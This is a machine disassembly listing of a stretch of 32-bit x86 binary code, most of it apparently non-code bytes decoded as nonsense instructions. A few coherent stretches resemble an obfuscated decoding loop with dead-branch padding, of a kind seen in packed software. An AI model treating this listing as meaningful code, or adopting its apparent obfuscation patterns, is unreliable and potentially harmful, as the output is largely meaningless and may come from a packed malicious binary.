  402945:	add    BYTE PTR [ecx+0x5fdd8da4],dl
  40294b:	mov    bh,0xaa
  40294d:	outs   dx,BYTE PTR ds:[esi]
  40294e:	hlt    
  40294f:	sbb    esi,DWORD PTR [esi+0x6ea4263a]
  402955:	adc    eax,0xcb5bece4
  40295a:	pop    edx
  40295b:	loop   0x402911
  40295d:	mov    bh,0x79
  40295f:	add    DWORD PTR [esi-0x66],edx
  402962:	dec    ebx
  402963:	jns    0x4028e5
  402965:	sub    DWORD PTR [eax+0xe92b237],0xb41724bf
  40296f:	jo     0x4029ee
  402971:	mov    bh,0xf3
  402973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402974:	cmp    eax,0xeffb66bc
  402979:	pop    ebp
  40297a:	iret   
  40297b:	cmp    bl,0x67
  40297e:	xor    ah,BYTE PTR [ebx-0x2ec01952]
  402984:	pop    ecx
  402985:	mov    dh,0x2e
  402987:	popf   
  402988:	inc    esi
  402989:	aas    
  40298a:	jbe    0x4029cb
  40298c:	push   ecx
  40298d:	retf   
  40298e:	xlat   BYTE PTR ds:[ebx]
  40298f:	les    esp,FWORD PTR [edx]
  402991:	add    eax,0x7ecd0853
  402996:	add    eax,DWORD PTR [ebx]
  402998:	inc    edi
  402999:	adc    eax,0x6d0789fd
  40299e:	jge    0x402991
  4029a0:	or     eax,0xc867cfee
  4029a5:	add    al,BYTE PTR [ebx]
  4029a7:	shl    DWORD PTR [ecx+ebp*2-0x20],1
  4029ab:	pusha  
  4029ac:	add    al,0xe6
  4029ae:	sub    eax,0xbf9d6adf
  4029b3:	mov    ecx,DWORD PTR [eax-0x5d0c0f60]
  4029b9:	rcr    DWORD PTR [ebx],1
  4029bb:	mov    eax,ds:0x78904baf
  4029c0:	out    0xd4,eax
  4029c2:	mov    bh,0x48
  4029c4:	pop    ds
  4029c5:	fs mov bh,0xc5
  4029c8:	cmp    esi,DWORD PTR [eax-0x66283b3a]
  4029ce:	jne    0x40297a
  4029d0:	cs cwde 
  4029d2:	xor    al,0x42
  4029d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029d5:	cdq    
  4029d6:	mov    eax,0xbeda4c03
  4029db:	icebp  
  4029dc:	jmp    DWORD PTR [esi+0x47]
  4029df:	sub    bl,BYTE PTR [ebx+ecx*4+0x617d3e02]
  4029e6:	addr16 jge 0x402978
  4029e9:	dec    edi
  4029ea:	and    al,0xa
  4029ec:	stc    
  4029ed:	icebp  
  4029ee:	sub    al,0x1c
  4029f0:	out    dx,eax
  4029f1:	push   ebx
  4029f2:	or     edx,0x58
  4029f5:	leave  
  4029f6:	(bad)  [edx-0x56]
  4029f9:	lods   al,BYTE PTR ds:[esi]
  4029fa:	cmp    dl,BYTE PTR [esi-0x42]
  4029fd:	push   edx
  4029fe:	cwde   
  4029ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a00:	js     0x402a70
  402a02:	xor    BYTE PTR [eax],cl
  402a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a05:	sbb    ebp,0x8553721
  402a0b:	lahf   
  402a0c:	or     DWORD PTR [eax+0x33107d03],esp
  402a12:	rol    DWORD PTR [ebx],1
  402a14:	(bad)  
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x4495f980,al
  402a42:	and    ch,BYTE PTR [eax+0xc]
  402a45:	jle    0x402ac5
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a27
  402a4c:	adc    DWORD PTR [esi-0x67388dc5],edx
  402a52:	out    dx,eax
  402a53:	sub    BYTE PTR [ebx-0x10d2e284],ah
  402a59:	lea    esi,[ebp-0x3131f047]
  402a5f:	pop    eax
  402a60:	add    al,0xf0
  402a62:	cwde   
  402a63:	jg     0x4029f6
  402a65:	in     eax,0x1f
  402a67:	ret    
  402a68:	cli    
  402a69:	fst    DWORD PTR [esi+eax*4]
  402a6c:	xchg   ecx,eax
  402a6d:	ja     0x402ace
  402a6f:	jge    0x402a82
  402a71:	jb     0x402a07
  402a73:	mov    cl,0x63
  402a75:	adc    al,0x37
  402a77:	mov    edi,DWORD PTR [ecx+0x5c]
  402a7a:	and    DWORD PTR [eax+edi*1],edx
  402a7d:	std    
  402a7e:	into   
  402a7f:	push   ebp
  402a80:	jmp    0x9a3671db
  402a85:	mov    cl,0x9f
  402a87:	stos   BYTE PTR es:[edi],al
  402a88:	dec    edi
  402a89:	or     al,ah
  402a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8c:	popf   
  402a8d:	ja     0x402a86
  402a8f:	sub    esp,esp
  402a91:	aaa    
  402a92:	pop    eax
  402a93:	ss mov cl,bl
  402a96:	cld    
  402a97:	jmp    0xa88f:0x6d1ea66b
  402a9e:	pop    ebx
  402a9f:	hlt    
  402aa0:	cs inc edi
  402aa2:	xlat   BYTE PTR ds:[ebx]
  402aa3:	mov    bl,0x1a
  402aa5:	jns    0x402afa
  402aa7:	nop
  402aa8:	xor    eax,0x9cd8952c
  402aad:	test   BYTE PTR [esi+0x7d56e91f],0xf8
  402ab4:	inc    esi
  402ab5:	adc    al,0x54
  402ab7:	rol    DWORD PTR [ecx],cl
  402ab9:	shl    DWORD PTR fs:[esi-0x5111c42b],1
  402ac0:	or     ch,BYTE PTR [edi-0x3aa24b2]
  402ac6:	and    BYTE PTR [edx-0x28],bl
  402ac9:	pop    edx
  402aca:	cmp    eax,0xb635117d
  402acf:	mov    esi,0xe4966d8a
  402ad4:	adc    al,BYTE PTR [esi+eax*4+0x56]
  402ad8:	call   0x79ba:0x31a4a79e
  402adf:	jg     0x402aa3
  402ae1:	inc    edi
  402ae2:	mov    esp,0x1e5b0ed1
  402ae7:	int3   
  402ae8:	push   ebx
  402ae9:	pcmpeqb mm0,mm4
  402aec:	dec    eax
  402aed:	or     al,BYTE PTR [edx+0x0]
  402af0:	imul   eax,ecx,0x5c5872e7
  402af6:	nop
  402af7:	and    edx,ebp
  402af9:	outs   dx,DWORD PTR ds:[esi]
  402afa:	mov    esp,0x8792a7a7
  402aff:	sub    al,0x41
  402b01:	jne    0x402b23
  402b03:	jns    0x402af2
  402b05:	pop    edi
  402b06:	mov    cs,WORD PTR [edx]
  402b08:	add    BYTE PTR [eax],ah
  402b0a:	xchg   ebx,eax
  402b0b:	cdq    
  402b0c:	mov    al,BYTE PTR [ecx]
  402b0e:	div    DWORD PTR [ebp-0x6e0108d8]
  402b14:	sbb    edx,DWORD PTR [esi-0x1f6ffb42]
  402b1a:	mov    gs,ebp
  402b1c:	or     sp,di
  402b1f:	mov    ss,WORD PTR [ebx]
  402b21:	cmp    esi,DWORD PTR [esi-0x46b3ca09]
  402b27:	sub    BYTE PTR [edx],bh
  402b29:	mov    bh,0xd7
  402b2b:	mov    al,0xeb
  402b2d:	pushf  
  402b2e:	stc    
  402b2f:	jb     0x402b53
  402b31:	and    BYTE PTR [esp+esi*4-0x1fce2577],bl
  402b38:	fdiv   st,st(5)
  402b3a:	iret   
  402b3b:	mov    edi,0x89282c53
  402b40:	push   ecx
  402b41:	in     eax,0x7
  402b43:	div    BYTE PTR [esi+ebp*2+0x5f617bc9]
  402b4a:	push   ds
  402b4b:	fistp  QWORD PTR [edi]
  402b4d:	addr16 gs xchg ebp,eax
  402b50:	or     dl,bl
  402b52:	jmp    0xb69c:0xdfebe9bd
  402b59:	(bad)
  402b5c:	sbb    al,0x8c
  402b5e:	xchg   al,ch
  402b60:	das    
  402b61:	and    BYTE PTR [ecx+0x4e7fff16],ch
  402b67:	pop    ecx
  402b68:	push   cs
  402b69:	mov    ds:0x73de78ff,al
  402b6e:	ins    BYTE PTR es:[edi],dx
  402b6f:	mov    ah,0x50
  402b71:	cmp    eax,0x7bff9a30
  402b76:	adc    cl,BYTE PTR [ecx]
  402b78:	outs   dx,BYTE PTR ds:[esi]
  402b79:	jle    0x402bea
  402b7b:	ret    0xa9de
  402b7e:	mov    ch,0x30
  402b80:	mov    bh,0xc1
  402b82:	push   0xf8991e5
  402b87:	cmp    BYTE PTR [esi],bl
  402b89:	push   eax
  402b8a:	mov    edx,0xd1d22f37
  402b8f:	sub    al,0xe6
  402b91:	inc    edx
  402b92:	fstp   TBYTE PTR [edx]
  402b94:	push   edx
  402b95:	in     eax,0xb6
  402b97:	arpl   bp,bx
  402b99:	mov    al,ds:0x95fa5947
  402b9e:	adc    eax,0x7bad7839
  402ba3:	adc    esp,DWORD PTR [edi+0xe721437]
  402ba9:	dec    ebp
  402baa:	mov    bl,0x6d
  402bac:	push   ss
  402bad:	mov    bh,0x5b
  402baf:	mov    eax,ds:0xb0de6d05
  402bb4:	call   0x3eb3565b
  402bb9:	mov    ecx,0xda5af694
  402bbe:	aas    
  402bbf:	pop    edi
  402bc0:	cld    
  402bc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc2:	lods   eax,DWORD PTR ds:[esi]
  402bc3:	pop    eax
  402bc4:	test   al,0x3b
  402bc6:	bound  esp,QWORD PTR [ecx-0x6820cb82]
  402bcc:	cld    
  402bcd:	adc    DWORD PTR [ecx-0x3ba162b6],edi
  402bd3:	ss jl  0x402c18
  402bd6:	in     eax,dx
  402bd7:	mov    DWORD PTR [esp+ebp*1-0x66],eax
  402bdb:	inc    ebp
  402bdc:	add    ebx,0xf82ac725
  402be2:	sbb    al,0x37
  402be4:	jmp    0x402c33
  402be6:	out    dx,eax
  402be7:	lahf   
  402be8:	aas    
  402be9:	popa   
  402bea:	sahf   
  402beb:	cmp    al,0x73
  402bed:	xor    BYTE PTR [edx+0x8],ch
  402bf0:	ja     0x402c55
  402bf2:	and    DWORD PTR [ebp-0x2],edi
  402bf5:	cmp    ah,dh
  402bf7:	push   es
  402bf8:	(bad)  
  402bf9:	repnz out dx,eax
  402bfb:	fldenv [eax-0x3b97cf66]
  402c01:	int    0xe4
  402c03:	cmp    bh,BYTE PTR [eax]
  402c05:	call   0xdabcebb5
  402c0a:	mov    esp,0xaf4b18b
  402c0f:	mov    ch,BYTE PTR [ecx+0x2c5035d9]
  402c15:	xor    DWORD PTR [esi+0x3c7402ed],edi
  402c1b:	fwait
  402c1c:	add    DWORD PTR [ecx+0x71f1528d],0xffffffbe
  402c23:	inc    edx
  402c24:	mov    ebp,ss
  402c26:	xor    edi,ecx
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x88
  402c6b:	pop    ds
  402c6c:	mov    ecx,0x7e0a4f0f
  402c71:	jle    0x402cc8
  402c73:	jg     0x402cf3
  402c75:	jle    0x402bff
  402c77:	mov    esi,0xb90137cb
  402c7c:	call   0xd9730191
  402c81:	nop
  402c82:	xor    cl,BYTE PTR [esi+esi*2-0x25c27dae]
  402c89:	xor    DWORD PTR [eax-0x63],eax
  402c8c:	outs   dx,DWORD PTR ds:[esi]
  402c8d:	cwde   
  402c8e:	xchg   DWORD PTR [ebp+0x5642b44e],esi
  402c94:	or     ecx,edi
  402c96:	scas   eax,DWORD PTR es:[edi]
  402c97:	jecxz  0x402ccd
  402c99:	ficom  DWORD PTR [eax-0x4d]
  402c9c:	mov    ebx,0x3573f20f
  402ca1:	test   DWORD PTR [edi],edi
  402ca3:	loope  0x402d1d
  402ca5:	ds out 0x88,al
  402ca8:	push   ebp
  402ca9:	out    0x61,eax
  402cab:	adc    bh,cl
  402cad:	test   al,0xea
  402caf:	push   edx
  402cb0:	int3   
  402cb1:	mov    al,ds:0xc07210d4
  402cb6:	jno    0x402ca8
  402cb8:	iret   
  402cb9:	and    bh,BYTE PTR [ebx]
  402cbb:	scas   eax,DWORD PTR es:[edi]
  402cbc:	mov    bh,0xe2
  402cbe:	and    bh,BYTE PTR [ecx+eiz*2+0x1960a6e0]
  402cc5:	sbb    BYTE PTR [esi+0x7ec34ace],cl
  402ccb:	mov    ebp,gs
  402ccd:	pop    edi
  402cce:	mov    ebp,0x14462a97
  402cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cd5:	je     0x402cbe
  402cd7:	sub    BYTE PTR [esi*4-0x4419e5dd],bh
  402cde:	es iret 
  402ce0:	rcr    DWORD PTR [ebp+0x2e7caa0],1
  402ce6:	outs   dx,DWORD PTR ds:[esi]
  402ce7:	mov    dh,0x4e
  402ce9:	pop    ebp
  402cea:	out    0xfd,eax
  402cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ced:	ins    DWORD PTR es:[edi],dx
  402cee:	outs   dx,BYTE PTR ds:[esi]
  402cef:	jno    0x402d4e
  402cf1:	lea    ebp,[ebx+0x4e3d7b52]
  402cf7:	jle    0x402cc3
  402cf9:	mov    BYTE PTR [edi],dh
  402cfb:	shl    ebx,cl
  402cfd:	sub    DWORD PTR [ecx+0xe],edi
  402d00:	retf   0xd0fe
  402d03:	sub    ecx,ebp
  402d05:	add    dl,ah
  402d07:	std    
  402d08:	sti    
  402d09:	add    bl,cl
  402d0b:	pop    ecx
  402d0c:	out    0xfa,eax
  402d0e:	(bad)  
  402d0f:	pop    ss
  402d10:	in     al,dx
  402d11:	fild   WORD PTR [eax]
  402d13:	fdiv   st(1),st
  402d15:	dec    esp
  402d16:	rcl    BYTE PTR ss:[eax],0xe3
  402d1a:	out    0x78,al
  402d1c:	(bad)  
  402d1d:	(bad)  
  402d1e:	push   ecx
  402d1f:	cmp    al,0x4e
  402d21:	sub    edi,edx
  402d23:	sbb    eax,0xb82bb22f
  402d28:	xchg   esp,eax
  402d29:	adc    dh,ah
  402d2b:	inc    edi
  402d2c:	aam    0xed
  402d2e:	or     edx,edx
  402d30:	jmp    0xb9eb:0xe7119d46
  402d37:	add    DWORD PTR [eax-0x3be1bde8],0xffffffe6
  402d3e:	cmp    al,0xa9
  402d40:	mov    ecx,0x37a03fe8
  402d45:	sbb    DWORD PTR [eax],0x724a0c11
  402d4b:	add    eax,0x8a35999e
  402d50:	dec    ebp
  402d51:	std    
  402d52:	in     al,dx
  402d53:	inc    esp
  402d54:	mov    dl,0x15
  402d56:	iret   
  402d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d58:	xchg   esp,eax
  402d59:	pop    ebp
  402d5a:	add    DWORD PTR [esi+ebp*4],esi
  402d5d:	imul   ebx,DWORD PTR [edx-0x5],0x39
  402d61:	mov    bl,BYTE PTR [ecx+0x53]
  402d64:	and    DWORD PTR [eax],edi
  402d66:	mov    ebp,0xbafa0d1c
  402d6b:	outs   dx,BYTE PTR ds:[esi]
  402d6c:	popf   
  402d6d:	mov    ds,WORD PTR [ebp-0x10965cd6]
  402d73:	test   BYTE PTR [eax-0x4],0x1f
  402d77:	rcr    edx,cl
  402d79:	out    dx,al
  402d7a:	mov    BYTE PTR [edi+0x79],ah
  402d7d:	jne    0x402d92
  402d7f:	dec    ebp
  402d80:	mov    esi,0x2d30f3e
  402d85:	mov    ebx,0x3e886991
  402d8a:	mov    bl,0x58
  402d8c:	repnz fild QWORD PTR [edi-0x6af540dc]
  402d93:	mov    ah,0xcb
  402d95:	loopne 0x402d9d
  402d97:	mov    eax,ds:0xdf225676
  402d9c:	xor    eax,0x75f47ba
  402da1:	mov    al,0x90
  402da3:	mov    ebp,0xd6ea5a1e
  402da8:	les    esp,FWORD PTR [ebx]
  402daa:	add    ecx,DWORD PTR [eax-0x7a]
  402dad:	mov    dl,0x5a
  402daf:	mov    bh,0x94
  402db1:	rcl    DWORD PTR [edx+edx*1-0x32],0xba
  402db6:	lahf   
  402db7:	push   esi
  402db8:	xchg   esp,eax
  402db9:	fsub   DWORD PTR [ebx-0x36f1bc48]
  402dbf:	fsubr  st,st(0)
  402dc1:	and    ebx,DWORD PTR [ebp+0x28fa641c]
  402dc7:	fdivr  st,st(5)
  402dc9:	mov    dl,0x90
  402dcb:	nop
  402dcc:	call   0x1728ff78
  402dd1:	outs   dx,DWORD PTR ds:[esi]
  402dd2:	fcomp  st(4)
  402dd4:	dec    DWORD PTR [edi]
  402dd6:	int3   
  402dd7:	and    dl,cl
  402dd9:	mov    edx,0x67831cda
  402dde:	push   0xfffffff1
  402de0:	inc    ebx
  402de1:	mov    ds:0x3cde5028,eax
  402de6:	push   es
  402de7:	idiv   bl
  402de9:	jl     0x402dd0
  402deb:	into   
  402dec:	add    al,ah
  402dee:	jb     0x402db6
  402df0:	retf   0xdb5d
  402df3:	xor    eax,0xf006897b
  402df8:	push   ebp
  402df9:	add    DWORD PTR [edi],eax
  402dfb:	fs (bad) 
  402dfd:	fs push esi
  402dff:	adc    eax,0x892416
  402e04:	daa    
  402e05:	xor    bh,dl
  402e07:	scas   al,BYTE PTR es:[edi]
  402e08:	adc    edi,DWORD PTR [ebp-0x3a1e7298]
  402e0e:	idiv   BYTE PTR [eax-0x45]
  402e11:	cmp    dl,dl
  402e13:	arpl   WORD PTR [ebp-0x38],bp
  402e16:	sub    al,0xb0
  402e18:	push   0x4bff1c95
  402e1d:	lods   al,BYTE PTR ds:[esi]
  402e1e:	mul    BYTE PTR [esi+0x30]
  402e21:	inc    esi
  402e22:	pop    es
  402e23:	das    
  402e24:	pop    ecx
  402e25:	xchg   ebx,eax
  402e26:	pop    eax
  402e27:	inc    ecx
  402e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e29:	mov    BYTE PTR [eax-0x2c],0x1
  402e2d:	push   eax
  402e2e:	in     eax,dx
  402e2f:	lds    ebp,FWORD PTR [eax]
  402e31:	cmp    eax,0x625cb605
  402e36:	dec    ecx
  402e37:	js     0x402e45
  402e39:	and    ebp,DWORD PTR [eax+eax*8+0x64172b98]
  402e40:	dec    ebx
  402e41:	or     ebx,DWORD PTR [eax-0xd]
  402e44:	sub    esi,ecx
  402e46:	fldcw  WORD PTR [esi-0x3c]
  402e49:	pop    es
  402e4a:	stos   DWORD PTR es:[edi],eax
  402e4b:	int    0xa
  402e4d:	leave  
  402e4e:	jle    0x10b531bf
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	jo     0x40302b
  403051:	cmp    ch,bl
  403053:	mov    ds:0xae7e7e08,al
  403058:	jg     0x4030d8
  40305a:	jle    0x40309e
  40305c:	out    0x1,eax
  40305e:	pushf  
  40305f:	fld    TBYTE PTR [ebx+0x45]
  403062:	fidivr DWORD PTR [ebx-0x2033cacd]
  403068:	xchg   ebx,eax
  403069:	fdivp  st(6),st
  40306b:	sbb    bh,BYTE PTR [edx]
  40306d:	sbb    DWORD PTR [ebx+0x7c1ce8c0],0x5389fcbd
  403077:	sbb    al,0x17
  403079:	mov    esp,0xb1417305
  40307e:	mov    ch,0xce
  403080:	lea    eax,[esi]
  403082:	cmp    bl,BYTE PTR [eax+0x6abfbef3]
  403088:	mov    cl,0x2f
  40308a:	clc    
  40308b:	push   esi
  40308c:	clc    
  40308d:	dec    edi
  40308e:	outs   dx,DWORD PTR ds:[esi]
  40308f:	cmp    eax,0x2c1c06c9
  403094:	cdq    
  403095:	dec    ebp
  403096:	ss std 
  403098:	jno    0x4030eb
  40309a:	loop   0x403036
  40309c:	push   0x46be7f0c
  4030a1:	pop    ebp
  4030a2:	push   ds
  4030a3:	shr    esp,1
  4030a5:	fdivp  st(6),st
  4030a7:	retf   
  4030a8:	std    
  4030a9:	dec    ebp
  4030aa:	mov    eax,DWORD PTR [edx+ebx*2+0x7]
  4030ae:	sbb    ah,BYTE PTR [ebx]
  4030b0:	popf   
  4030b1:	aas    
  4030b2:	dec    ebp
  4030b3:	and    BYTE PTR [esi-0x17232464],ah
  4030b9:	dec    edi
  4030ba:	add    DWORD PTR [eax],ebx
  4030bc:	dec    edx
  4030bd:	push   eax
  4030be:	inc    ebp
  4030bf:	test   al,0x68
  4030c1:	jns    0x403105
  4030c3:	div    BYTE PTR [esi+0x3b]
  4030c6:	sbb    eax,0xff5a6e7
  4030cb:	or     al,0x50
  4030cd:	iret   
  4030ce:	sub    BYTE PTR [edx-0x2],0xf5
  4030d2:	xchg   edi,eax
  4030d3:	out    0x1f,eax
  4030d5:	jg     0x4030c5
  4030d7:	lods   eax,DWORD PTR ds:[esi]
  4030d8:	in     eax,dx
  4030d9:	into   
  4030da:	call   0x3e65e9d7
  4030df:	inc    eax
  4030e0:	aaa    
  4030e1:	xchg   ecx,eax
  4030e2:	xor    ecx,ebp
  4030e4:	mov    al,ds:0x29b29d9b
  4030e9:	dec    ecx
  4030ea:	adc    eax,0x582f2f9d
  4030ef:	jecxz  0x403124
  4030f1:	push   esi
  4030f2:	lea    ebx,[esi]
  4030f4:	not    BYTE PTR [eax]
  4030f6:	pop    es
  4030f7:	jno    0x4030a2
  4030f9:	dec    edx
  4030fa:	lock sbb eax,0x593187fd
  403100:	jp     0x403178
  403102:	jl     0x40311f
  403104:	xchg   BYTE PTR [ebp-0x6c],dh
  403107:	adc    eax,0xa955c4e0
  40310c:	push   eax
  40310d:	jl     0x403164
  40310f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403110:	adc    BYTE PTR [ecx+ecx*4-0x2a],al
  403114:	mov    BYTE PTR [edx],0x4e
  403117:	retf   0x2117
  40311a:	fisub  WORD PTR [ecx+0x7f]
  40311d:	icebp  
  40311e:	mov    DWORD PTR [ebx+0x644d0246],0xe0aaaf14
  403128:	cmp    esp,DWORD PTR [ecx-0x4e54e0bb]
  40312e:	xor    dl,ch
  403130:	or     al,0x41
  403132:	icebp  
  403133:	sub    al,0xa3
  403135:	cmp    al,0xeb
  403137:	mov    al,0x3e
  403139:	jae    0x4031a6
  40313b:	test   BYTE PTR [edx],al
  40313d:	cmp    esi,DWORD PTR [eax-0x46]
  403140:	xor    BYTE PTR [ebp+0x13e80237],0xd3
  403147:	aam    0xd9
  403149:	pop    ecx
  40314a:	js     0x4031bf
  40314c:	push   edx
  40314d:	ins    DWORD PTR es:[edi],dx
  40314e:	mov    ebp,0x9cbd1c05
  403153:	loopne 0x40318f
  403155:	aad    0xe
  403157:	enter  0x4e59,0xb7
  40315b:	mov    ebx,0xd309e2c3
  403160:	rep lods al,BYTE PTR ds:[esi]
  403162:	cmp    eax,0xdbf848b0
  403167:	out    dx,al
  403168:	or     edi,DWORD PTR [ecx-0x73]
  40316b:	std    
  40316c:	(bad)  
  40316d:	outs   dx,BYTE PTR ds:[esi]
  40316e:	gs fdivrp st(0),st
  403171:	loope  0x403106
  403173:	test   al,0x57
  403175:	push   ebx
  403176:	or     al,0x49
  403178:	mov    BYTE PTR [esi+0x73dfe0c2],ch
  40317e:	jnp    0x4031d8
  403180:	sub    dl,bh
  403182:	mov    ds:0xb2b277cb,al
  403187:	out    dx,eax
  403188:	push   0x3e
  40318a:	and    ch,ah
  40318c:	dec    edi
  40318d:	retf   
  40318e:	out    dx,al
  40318f:	outs   dx,BYTE PTR ds:[esi]
  403190:	arpl   WORD PTR [esi-0x186b1ae7],ax
  403196:	pop    ebx
  403197:	pushf  
  403198:	addr16 ja 0x4031b6
  40319b:	cmp    ah,BYTE PTR [ecx]
  40319d:	adc    dl,BYTE PTR [edi]
  40319f:	das    
  4031a0:	in     eax,dx
  4031a1:	pop    ecx
  4031a2:	sbb    DWORD PTR ds:0x231ea689,esi
  4031a8:	pop    esi
  4031a9:	aam    0xc
  4031ab:	aas    
  4031ac:	out    dx,eax
  4031ad:	sub    DWORD PTR [edi-0x598f9d1f],edi
  4031b3:	div    BYTE PTR [edi]
  4031b5:	ret    0xaf78
  4031b8:	lods   eax,DWORD PTR ds:[esi]
  4031b9:	arpl   WORD PTR [ebp-0x41],si
  4031bc:	inc    esp
  4031bd:	dec    ebx
  4031be:	out    dx,al
  4031bf:	lds    edx,FWORD PTR [eax]
  4031c1:	imul   edi,DWORD PTR [eax],0xffffffe4
  4031c4:	mov    dh,0x3a
  4031c6:	mov    edi,0xcc85879
  4031cb:	sbb    eax,0xbeb2f87c
  4031d0:	adc    ecx,DWORD PTR [ecx+edx*2+0x510131e6]
